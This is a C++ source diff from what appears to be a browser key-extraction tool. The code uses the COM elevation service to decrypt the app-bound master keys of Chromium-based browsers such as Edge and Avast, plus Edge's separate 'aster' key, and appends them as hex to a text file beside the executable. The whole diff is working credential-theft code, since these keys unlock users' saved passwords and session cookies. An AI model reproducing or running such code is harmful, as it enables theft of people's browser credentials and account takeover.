@@ -43,11 +43,14 @@ std::string BytesToHex(const std::vector<uint8_t>& bytes) {
     return hex;
 }
 
-void SaveKeyToFile(const std::string& filename, const std::string& content) {
-    std::ofstream out(filename, std::ios::app);
+void SaveKeyToFile(const std::string& content) {
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    std::string dir = std::filesystem::path(path).parent_path().string();
+    std::string file = dir + "\\chromium_keys.txt";
+    std::ofstream out(file, std::ios::app);
     if (out.is_open()) {
         out << content << std::endl;
-        out.close();
     }
 }
 
@@ -63,14 +66,14 @@ void Execute() {
         masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
     }
 
-    SaveKeyToFile("chromium_keys.txt", browser.name + ":" + BytesToHex(masterKey));
+    SaveKeyToFile(browser.name + ":" + BytesToHex(masterKey));
 
     if (browser.name == "Edge") {
         try {
             auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
             Com::Elevator elevator;
             auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
-            SaveKeyToFile("chromium_keys.txt", "ASTER_KEY:" + BytesToHex(asterKey));
+            SaveKeyToFile("ASTER_KEY:" + BytesToHex(asterKey));
         } catch (...) {}
     }
 }
